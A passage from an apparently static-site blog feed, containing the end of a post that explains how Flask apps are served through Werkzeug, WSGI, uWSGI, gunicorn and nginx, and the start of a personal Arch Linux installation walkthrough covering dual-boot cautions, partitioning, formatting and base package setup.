class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure><p>Then, we register different URIs and define the corresponding functions to call when they get hit.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You found me!&quot;</span></span><br></pre></td></tr></table></figure><p>And that’s really all there is to a web application!</p><p>Think of the app as an API. The app object doesn’t “do” anything; it just defines requests and how to respond to these requests.</p><h2 id="Application-Server"><a href="#Application-Server" class="headerlink" title="Application Server"></a>Application Server</h2><p>The Flask application object defines the different URIs and appropriate responses. However, it’s not capable of actually “serving” the application - it’s just a definition. We need a separate piece of software to serve the app, and we call it an application server. A server handles details about:</p><ul><li>Network connections (sockets, hosts, ports, etc)</li><li>Receiving requests over the network</li><li>Sending responses over the network</li><li>Multiplexing users</li></ul><p>How does it do this? It starts by listening for incoming connections on a host and port. When it receives a request, it parses the request and current environment for information like:</p><ul><li>HTTP headers</li><li>Input form data</li><li>Environment Variables</li></ul><p>Then, it sends the request information to the application (the <code>app</code> object we defined previously). The app object constructs the HTML content and returns it to the server, which then puts the content together with headers and other information. Finally, the server sends the response to the requester over the network.</p><p>The server might use threads and buffers to deal with multiple simultaneous connections, where each thread sends request information to its own <code>app</code> object and responds to its request with the returned content. There are several different application servers out there, each with its own advantages and disadvantages.</p><h2 id="Werkzeug-Flask’s-Debug-Server"><a href="#Werkzeug-Flask’s-Debug-Server" class="headerlink" title="Werkzeug - Flask’s Debug Server"></a>Werkzeug - Flask’s Debug Server</h2><p>So how do we find a server program to serve our Flask application? Well, it turns out that Flask comes with one!</p><p>Flask comes with a built-in library called “Werkzeug”, and that library contains a server to serve your app. The Werkzeug server is instantiated and run if you call <code>app.run()</code>, where <code>app</code> is the object you got from <code>app = Flask(__name__)</code>. Now, you can serve real requests to and from your app! The <code>run()</code> function takes some arguments like what IP address you want to serve from, what port to serve from, and whether debug messages should be printed on error.</p><pre><code>Q: Can I just write a web application with Flask and NOT start the built-in server?</code></pre><p>YES! You’re not forced to run Werkzeug’s server.<br>The <code>app</code> object represents just the application and doesn’t start a server until <code>app.run()</code>.<br>The <code>app</code> object won’t actively handle real requests; it just defines the API for requests.<br>You could use another server other than Werkzeug’s server to mediate requests to the <code>app</code> object.</p><pre><code>Q: Why would I even want to use another server if Flask already gives us one?</code></pre><p>Werkzeug’s server isn’t designed to be efficient, stable, or secure. It doesn’t scale well when multiple users access the website (which is why my website was so slow!). Werkzeug’s server is purely something for quick testing during development of your application, without having to search for and install another server program. There are much better server programs that can efficiently support hundreds or even thousands of connections at the same time!</p><h2 id="WSGI-Web-Server-Gateway-Interface"><a href="#WSGI-Web-Server-Gateway-Interface" class="headerlink" title="WSGI - Web Server Gateway Interface"></a>WSGI - Web Server Gateway Interface</h2><p>The servers that exist today are complex software that handle multiple parts of the server stack. To understand why, it’s important to first understand what the WSGI protocol is and why it came to be.</p><h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><p>There are many competing web servers to choose from (Werkzeug, Apache, nginx, Lighttpd, etc).<br>There are also many Python webapp frameworks (Flask, Django, Tornado, Pyramid, etc).</p><p>In the past, each server expected response content from the webapp in different formats. Similarly, each webapp framework expected request content from the server in different formats. If you got tired of using Flask and wanted to switch to Django, you might’ve had to find a different server that supported the request&#x2F;response format that Django used. It would be great if each framework could work with any of the server programs and vice-versa. That way, you could keep your existing server configurations even if you wanted to switch webapp frameworks.</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>Eventually, some smart people decided to make a standardized protocol for requests and responses between servers and apps. The Python community introduced WSGI (pronounced “whiz-gee”) as this protocol. WSGI standardizes the way servers talk to Python webapps and vice-versa. Today, all servers and Python webapps implement WSGI.</p><img src="/Serving-Flask/WSGI.png" class=""><center>Image from [https://ruslanspivak.com/lsbaws-part2/](https://ruslanspivak.com/lsbaws-part2/)</center><p>In our examples from before, Flask was the webapp and Werkzeug was the web server. Both of these are WSGI compliant!</p><p>For a webapp framework to be WSGI compliant, it just needs to define a function with 2 parameters.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">app</span>(<span class="params">environment, start_fn</span>):</span><br><span class="line">    <span class="comment"># environment : a dict with all the incoming request information (filled in by the server)</span></span><br><span class="line">    <span class="comment"># start_fn         : a callback function defined by the server</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt;Here&#x27;s your response page!&lt;/html&gt;&quot;</span></span><br></pre></td></tr></table></figure><p>We call this function the “callable”. What should the callable do?</p><ol><li><p>Understand the request. What are the incoming HTTP headers? Cookies? What is the URI being requested? All of this information comes from the <code>environment</code> dictionary.</p></li><li><p>Based on the URI being requested, construct an appropriate response. We already saw how Flask lets you define functions to implement this. The callable simply needs to call the right function for this URI.</p></li><li><p>Call <code>start_fn()</code>, which was provided by the server. There are 2 parameters to <code>start_fn()</code>; an HTTP response code and a list of response headers expressed as 2-tuples.</p><p> Ex: <code>start_fn(&#39;200 OK&#39;, [(&#39;Content-Type&#39;, &#39;text/plain&#39;)])</code></p></li><li><p>Return the actual bytes of the response as an iterable.</p><p> Ex: <code>[&quot;Hello World!\n&quot;]</code><br> Ex:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">app</span>(<span class="params">env, start_fun</span>):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">double</span>(<span class="params">L</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> L:</span><br><span class="line">            <span class="keyword">yield</span> <span class="built_in">str</span>(x**<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> double([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) <span class="comment"># returns a generator, which is iterable</span></span><br></pre></td></tr></table></figure><p>That’s it! That’s all it takes to build a WSGI compliant webapp. You could even create your own WSGI Python webapp without Flask or Django  using just this knowledge.</p><h3 id="Flask’s-Callable"><a href="#Flask’s-Callable" class="headerlink" title="Flask’s Callable"></a>Flask’s Callable</h3><p>To be WSGI compliant, the webapp has to define a callable function (shown above as <code>app</code>) with two parameters. But the “function” can actually be an object too! As long as the object implements <code>__call__</code>, it’s callable like a function is. In Flask, the object returned by the <code>Flask()</code> constructor is the WSGI callable. So when you write <code>app = Flask(__name__)</code>, you’re creating a callable called <code>app</code>. Looking at the <a href="https://github.com/pallets/flask/blob/master/src/flask/app.py#L2448">source</a> for the Flask class, you can see it implements <code>__call__</code>. As expected, it takes 2 arguments:</p><ul><li>environ        - A WSGI environment (A dict with the request information)</li><li>start_response - A function that accepts a status code and list of headers for the response</li></ul><p>Any server that is WSGI compliant will require a reference to the <code>app</code> callable. The server communicates with your callable using the WSGI process we defined above, passing along request information and receiving response information. For more information about building a WSGI application, check out <a href="https://www.sitepoint.com/python-web-applications-the-basics-of-wsgi/">this page</a> where I learned most of this information from.</p><h2 id="Werkzeug"><a href="#Werkzeug" class="headerlink" title="Werkzeug"></a>Werkzeug</h2><p>Since every web application needs to provide callable functions and handle specific params it receives in WSGI form, it would be great if a library handled this “callable” interface. Well, it turns out that Werkzeug is this library! It provides utilities for developing WSGI-compliant webapps, like:</p><ul><li>Parsing headers</li><li>Sending and receiving cookies</li><li>Providing access to form data</li><li>Generating redirects</li><li>Generating error pages when there’s an exception</li><li>Providing an interactive debugger that works in the browser</li></ul><p>As we discussed before, it even includes a simple web server. Running a whole server like nginx is probably overkill for just testing on your own box. You can use the Werkzeug server to do your testing instead in a matter of seconds by just entering <code>app.run()</code>.</p><p>Flask uses the Werkzeug library, so Flask comes with the Werkzeug server. You pass the Flask <code>app</code> as the WSGI callable. As we mentioned before, the problem with this server is that isn’t meant to be efficient, scalable, or secure. So what are our other options?</p><h2 id="uWSGI"><a href="#uWSGI" class="headerlink" title="uWSGI"></a>uWSGI</h2><p>uWSGI is a full-fledged HTTP server. It takes in an HTTP request and converts it to a “WSGI request”. Then, it passes that along to the callable and waits for the response.</p><h2 id="Gunicorn-“Green-Unicorn”"><a href="#Gunicorn-“Green-Unicorn”" class="headerlink" title="Gunicorn (“Green Unicorn”)"></a>Gunicorn (“Green Unicorn”)</h2><img src="/Serving-Flask/gunicorn_logo.png" class=""><p>gunicorn is a web server modeled after Ruby’s “Unicorn” web server. It’s similar to uWSGI in that it takes in HTTP requests and translates them into WSGI requests for the callable. The main allure of gunicorn is that it’s very easy to setup. It also:</p><ul><li>Easily scales Flask apps to dynamically serve hundreds of users</li><li>Supports HTTP “Keep-Alive” through synchronous&#x2F;asynchronous workers</li><li>Supports SSL</li><li>Allows specifying number of worker processes</li><li>Incorporates asynchronous I&#x2F;O</li></ul><p>gunicorn uses a “pre-fork worker model”, which essentially means that a master process forks many other worker processes. Each worker process is ready to handle an incoming request and contains a reference to its own callable. Upon receiving a request, a worker will translate it to WSGI, send it to its callable, and wait for the response. Scaling a gunicorn server is easy since you just need to configure gunicorn to spawn more workers!</p><p>Pre-forking systems are great for low latency communication. They have no cost in spinning up a process to handle each request since the processes are already spun up and just sit around waiting. However, they’re not so great at handling slow clients and traffic surges since each worker thread is occupied with its request until it finishes. In those cases, you may be better off using nginx.</p><h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><img src="/Serving-Flask/nginx_logo.png" class=""><p>nginx is a reverse proxy that can also be used as a web server. nginx especially excels at:</p><ul><li>Handling large numbers of connections with little CPU&#x2F;memory cost (tens of thousands of connections at once!)</li><li>Serving static content (it can even redirect to a CDN or a separate bucket)</li><li>Handling gzip compression</li><li>Adding SSL&#x2F;TLS</li><li>Caching common requests</li></ul><p>nginx is more reslient in the face of slow clients as well since it only sends requests to the backend webapp as fast as the backend can handle. When the webapp returns a result, nginx buffers the response to feed it to slow clients at their own pace. The backend can move on to handling another request even as the slow client is still receiving the result.</p><p>Another use case for nginx is as a reverse proxy. Let’s say you’re serving multiple web apps from the same box, but perhaps on different IP addresses or ports. You can use nginx to route requests for any of the apps to the appropriate backend webapps. You could also use nginx similarly for load balancing.</p><p>Most commonly, you’ll see nginx used in conjunction with another web server like uWSGI or gunicorn sitting behind it, like the following:</p><img src="/Serving-Flask/architecture.gif" class=""><center>Image from [https://blog.paradisetechsoft.com/django-deployment-on-nginx-and-gunicorn/](https://blog.paradisetechsoft.com/django-deployment-on-nginx-and-gunicorn/)</center><p>You’d use nginx to:</p><ul><li><p>Route requests to multiple different web apps. If website A and website B both get routed to the machine that nginx is running on, nginx can reverse proxy the requests to the appropriate uWSGI&#x2F;gunicorn servers for each website.</p></li><li><p>Serve static content. The webapp itself is slow (Python interpreters are a bottleneck!). Serving off easy static content without invoking the interpreter significantly reduces the load on the backend webapp. Ideally, you’d only use the webapp to respond to dynamic content.</p></li><li><p>Handle thousands of connections at once with little memory&#x2F;CPU cost (it’s even better than gunicorn and uWSGI at this).</p></li><li><p>If one of your apps didn’t use WSGI and instead used something like CGI, you could use another nginx behind the muxing nginx to act as the HTTP request handler that translates and passes on the request to the web app using CGI.</p></li></ul><p>You’d use uWSGI&#x2F;gunicorn to:</p><ul><li><p>Translate the incoming HTTP request to WSGI.</p></li><li><p>Pass on the WSGI request info to the Flask callable.</p></li><li><p>Handle multiple requests sent from nginx to the web app.</p><p>  Q: Why doesn’t nginx translate HTTP requests to WSGI?<br> Why do you need uWSGI&#x2F;gunicorn to do it?</p></li></ul><p>This is about to get tricky, but bear with me. The TLDR is that nginx just doesn’t support that feature.</p><p>nginx can’t translate to WSGI, but it does have a module that can translate HTTP requests to something called <code>uwsgi</code>. Just enter <code>uwsgi_pass &lt;your_uWSGI_server&gt;</code> in your nginx configuration to enable this.</p><p>But, confusingly, uwsgi !&#x3D; WSGI !&#x3D; uWSGI.</p><ul><li>WSGI is a protocol for Python web servers that specifies the callable interface.</li><li>uWSGI is a server program that can receive requests and translate them into WSGI for the callable.</li><li>uwsgi is a binary protocol that nginx can send the request as and uWSGI can receive. It’s faster than having nginx send an HTTP request to uWSGI.</li></ul><p>Note: gunicorn doesn’t support receiving a request in the binary uwsgi protocol, so when nginx is used with gunicorn, you have to just send the HTTP request directly over to gunicorn (use <code>proxy_pass</code> instead of <code>uwsgi_pass</code>). This is probably the biggest real difference between gunicorn and uWSGI since uWSGI supports both HTTP and uwsgi.</p><p>So, nginx can’t directly send information to the Python callable because it doesn’t support the WSGI callable interface; it only supports directly forwarding the HTTP request or translating it to the uwsgi binary interface. WSGI callables will expect information to be passed to them via WSGI format, so nginx can’t call the callable directly. Why doesn’t nginx support the callable interface? I’m not sure. Maybe the devs are lazy? There would be marginal gain since there are already tons of projects like uWSGI and gunicorn that already implement this, so maybe there’s no reason to include it in nginx.</p><p>In conclusion, most commonly we would have nginx receiving the request. It would respond to static content requests immediately. For dynamic requests, it would forward the request over uwsgi or over HTTP to the uWSGI&#x2F;gunicorn server. Then, the uWSGI&#x2F;gunicorn server translates the request to WSGI protocol to make use of the Python app’s callable. The callable generates the response, which gets sent back up the chain to nginx to serve out to the requester.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Flask seems like a simple webapp framework and yet the details of efficiently serving it can get very complicated. I’ve tried to distill my admittedly cursory knowledge of the subject into this post but I’m sure there are still gaps to be filled. If you spot any inaccuracies or have different ways of serving your apps, I’d love to hear from you in the comments!</p>]]></content>
      
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Python </tag>
            
            <tag> gunicorn </tag>
            
            <tag> Werkzeug </tag>
            
            <tag> WSGI </tag>
            
            <tag> uWSGI </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Installing Arch Linux - Part 1</title>
      <link href="/Arch-Install/"/>
      <url>/Arch-Install/</url>
      
        <content type="html"><![CDATA[<img src="/Arch-Install/refind_bootmanager.bmp" class=""><p>After procrastinating for a year, I finally installed Arch Linux on my personal laptop. Unlike the Linux distros I had experience with in the past, Arch Linux is a very bare-bones distribution. While the Mint and Ubuntu installers take care of all the installation details with a nice GUI to guide you through the process, Arch just drops you with a shell and says “you’re on your own”. But as a reward for having so little assumed for you, you’re given fine-grained control over your system and can set it up just the way you like it!</p><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><p>My main motivation in installing Arch was to learn how Linux and my computer worked more deeply. By arming myself with nothing but the Wiki and the Arch ISO, I figured I would learn a lot from performing the installation steps manually - and I was right!</p><p>Here are some of the notes I took during the installation procedures. While this little post is no replacement for the Arch Wiki, I wanted to document my steps so I can refer to them if I ever decide to migrate to a new computer.</p><h2 id="Cautions-while-Dual-Booting-with-Windows"><a href="#Cautions-while-Dual-Booting-with-Windows" class="headerlink" title="Cautions while Dual-Booting with Windows"></a>Cautions while Dual-Booting with Windows</h2><h3 id="Set-Windows-to-UTC-Time"><a href="#Set-Windows-to-UTC-Time" class="headerlink" title="Set Windows to UTC Time"></a>Set Windows to UTC Time</h3><p>If you are dual-booting alongside Windows like me, you will want to set your Windows time to use UTC time instead of localtime. Linux treats the hardware clock as if it’s UTC time and computes the localtime from that, but Windows treats the hardware clock as if it’s localtime. Therefore, after installing Arch, you may notice that your Windows clock will be off by several hours.</p><p>See <a href="https://wiki.archlinux.org/index.php/time#UTC_in_Windows">https://wiki.archlinux.org/index.php/time#UTC_in_Windows</a> to figure out how to fix this before it becomes a problem.</p><h3 id="Disable-Fast-Boot"><a href="#Disable-Fast-Boot" class="headerlink" title="Disable Fast Boot"></a>Disable Fast Boot</h3><p>Windows has a feature called Fast Start-Up that hibernates the computer instead of shutting it down to decrease the boot times. This can cause data corruption if you shutdown your Windows machine and boot your Linux machine, since the Linux machine will mount the hibernated file system.</p><p>See <a href="https://wiki.archlinux.org/index.php/Dual_boot_with_Windows#Fast_Start-Up">https://wiki.archlinux.org/index.php/Dual_boot_with_Windows#Fast_Start-Up</a> to figure out how to disable fast boot before it becomes an issue.</p><h3 id="Secure-Boot"><a href="#Secure-Boot" class="headerlink" title="Secure Boot"></a>Secure Boot</h3><p>Before starting the installer, you may wish to enter your BIOS menu (hit F12 during boot) and disable Secure Boot to make your installation simpler.</p><h2 id="Connect-to-Internet-and-Set-Clock"><a href="#Connect-to-Internet-and-Set-Clock" class="headerlink" title="Connect to Internet and Set Clock"></a>Connect to Internet and Set Clock</h2><p>This installation was done on a machine that supports UEFI, so these steps were written as such. For older BIOS machines, you will want to refer to the Arch wiki.</p><p>First, press F12 at the hardware vendor loading screen to load the BIOS settings.<br>Then, select <code>UEFI BOOT from USB</code> to boot from the USB that contains your Arch ISO.<br>You should see the operating system on your USB boot up, eventually dropping you into a root shell.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Confirm UEFI Mode</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># If this directory is populated, you&#x27;re in UEFI.</span></span><br><span class="line"><span class="built_in">ls</span> /sys/firmware/efi/efivars</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Change Keyboard Layout</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># The default keyboard layout is US.</span></span><br><span class="line"><span class="comment"># See Arch guide if you want to change it to something else.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Connect to Internet</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># If you have an Ethernet cable, you can plug it in for automatic internet.</span></span><br><span class="line"><span class="comment"># Otherwise, you can use wireless.</span></span><br><span class="line">wifi-menu</span><br><span class="line">ping google.com <span class="comment"># Test connection</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Update the System Clock</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">timedatectl set-ntp <span class="literal">true</span></span><br><span class="line">timedatectl status <span class="comment"># Check status</span></span><br></pre></td></tr></table></figure><h2 id="Partitioning-Disks"><a href="#Partitioning-Disks" class="headerlink" title="Partitioning Disks"></a>Partitioning Disks</h2><p>Before you install Arch somewhere, you will need to partition your hard disk into segments that hold different pieces of your operating system. How you decide to partition is a matter of preference, but there are some basic partitions that everyone should consider:</p><table><thead><tr><th>Partition</th><th>Notes</th></tr></thead><tbody><tr><td>Root</td><td>Main partition that contains programs and files.</td></tr><tr><td>Boot</td><td>The EFI System partition. Typically ~512 MB but some OSes make it smaller (like Windows, which uses 99MB). You don’t need to remake the EFI System partition if it already exists.</td></tr><tr><td>Swap</td><td>Should be your RAM + 3GB else hibernate may not work.</td></tr><tr><td>Shared</td><td>Optional: Windows can only read NTFS file systems, so it may help to set aside a partition as a shared drive between Linux and Windows.</td></tr><tr><td>Home</td><td>Optional: Can be used to share files between Linux distributions if you have more than one. Not recommended to make this a separate partition unless you know what you’re doing.</td></tr></tbody></table><p>In my case, I went with the first four. My machine supported GPT partitioning as opposed to the older MBR scheme, so I went with GPT.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Note Existing Drives and Partitions</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">lsblk <span class="comment"># Lists the block devices</span></span><br><span class="line">fdisk -l  <span class="comment"># Show parittions, sizes, and types</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Partition the Drives</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># d deletes partitions.</span></span><br><span class="line"><span class="comment"># n adds new partitions.</span></span><br><span class="line"><span class="comment"># w writes table to disk.</span></span><br><span class="line">fdisk /dev/sdx <span class="comment"># Use for MBR</span></span><br><span class="line">gdisk /dev/sdx <span class="comment"># Use for GPT</span></span><br></pre></td></tr></table></figure><p>After partitioning, you will want to format each partition with an appropriate file system. Here are a few choices:</p><table><thead><tr><th>File System</th><th>Notes</th></tr></thead><tbody><tr><td>ext4</td><td>Most stable.</td></tr><tr><td>btrfs</td><td>Unstable, but probably the future of file systems.</td></tr><tr><td>tmpfs</td><td>Good for storage of temporary files; is the default for &#x2F;tmp in Arch.</td></tr><tr><td>ntfs</td><td>Windows readable.</td></tr><tr><td>FAT</td><td>Used for EFI System Partition.</td></tr></tbody></table><p>I went with vanilla ext4 for my root partition.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Format Partitions</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For each partition (root, home, etc.)</span></span><br><span class="line">mkfs.ext4 /dev/sdxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># For Swap</span></span><br><span class="line">mkswap /dev/sdxy</span><br><span class="line">swapon /dev/sdxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Mount the root file system to /mnt</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">mount /dev/sdxy /mnt</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Mount any remaining partitions except swap.</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># With Windows, just mount EFI partition as /mnt/boot</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt/boot</span><br><span class="line">mount /dev/sdxy /mnt/boot</span><br></pre></td></tr></table></figure><p>Here is my final partition scheme.</p><table><thead><tr><th>FS Type</th><th>Code</th><th>SDA</th><th>Size</th><th>Name</th></tr></thead><tbody><tr><td>2700</td><td>1</td><td>499 MB</td><td>Windows&#x2F;OEM Dell Recovery Environment</td><td></td></tr><tr><td>FAT</td><td>EF00</td><td>2</td><td>99 MB</td><td>EFI System Partition (ESP)</td></tr><tr><td>0C01</td><td>3</td><td>16 MB</td><td>MSR Partition</td><td></td></tr><tr><td>NTFS</td><td>0700</td><td>4</td><td>456.1 GB</td><td>Windows C-Drive</td></tr><tr><td>NTFS</td><td>0700</td><td>5</td><td>10 GB</td><td>Winshare</td></tr><tr><td>8200</td><td>6</td><td>11 GB</td><td>Swap</td><td></td></tr><tr><td>ext4</td><td>8304</td><td>7</td><td>400 GB</td><td>Arch x86_64 root (&#x2F;)</td></tr><tr><td>ext4</td><td>8304</td><td>8</td><td>53.8 GB</td><td>Unallocated</td></tr></tbody></table><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>Now, we are ready to install the base packages.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Select a Mirror</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Move a US mirror near the top to the very top of the mirror list.</span></span><br><span class="line">vim /etc/pacman.d/mirrorlist</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Install Packages</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># base is needed.</span></span><br><span class="line"><span class="comment"># base-devel is needed for building packages (useful for developers).</span></span><br><span class="line"><span class="comment"># Make sure this finishes without errors or the following steps may not work.</span></span><br><span class="line">pacstrap /mnt base base-devel</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Generate fstab file with UUIDs option</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Change root to new FS</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">arch-chroot /mnt</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Get vim ;)</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">pacman -S vim</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Set Timezone</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/share/zoneinfo/New_York /etc/localtime</span><br><span class="line">hwclock --systohc</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Generate Locales</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Search and uncomment &quot;en_US.UTF-8 UTF-8&quot;.</span></span><br><span class="line"><span class="comment"># Uncomment and any other localisations needed.</span></span><br><span class="line">vim /etc/locale.gen</span><br><span class="line">locale-gen</span><br><span class="line">vim /etc/locale.conf <span class="comment"># Enter LANG=en_US.UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Create Hostname File</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Enter only one line, the hostname you want</span></span><br><span class="line"><span class="comment"># Ex. user@emerald -&gt; emerald is the hostname</span></span><br><span class="line">vim /etc/hostname</span><br><span class="line"><span class="comment"># Add hostname to hosts file.</span></span><br><span class="line"><span class="comment"># a. Add this line</span></span><br><span class="line"><span class="comment"># 127.0.1.1 &lt;myhostname&gt;.localdomain&lt;myhostname&gt;</span></span><br><span class="line"><span class="comment"># b. Put myhostname at the end of the other lines too</span></span><br><span class="line"><span class="comment"># 127.0.0.1 